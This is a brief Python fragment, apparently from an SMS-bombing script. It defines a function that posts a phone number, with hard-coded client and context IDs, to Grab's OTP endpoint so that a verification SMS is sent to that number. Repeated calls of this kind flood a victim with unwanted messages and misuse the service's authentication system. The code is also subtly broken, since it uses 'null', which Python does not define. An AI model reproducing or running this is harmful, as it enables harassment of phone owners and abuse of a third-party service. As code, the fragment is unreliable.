...
def api2():
    requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp",data={"client_id":"4ddf78ade8324462988fec5bfc5874c2","ctx_id":"8d97c47535614647a117cc9599df39b7","transaction_ctx":null,"country_code":"TH","method":"SMS","num_digits":6,"scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number":phone})
